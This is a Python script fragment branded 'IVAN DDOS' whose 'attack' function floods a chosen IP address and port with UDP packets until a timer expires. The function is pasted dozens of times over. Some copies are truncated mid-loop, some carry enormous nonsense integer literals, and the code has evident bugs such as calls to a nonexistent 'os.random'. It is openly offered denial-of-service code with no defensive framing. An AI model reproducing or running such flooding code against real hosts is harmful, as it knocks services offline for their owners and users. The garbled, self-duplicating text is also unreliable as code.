    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
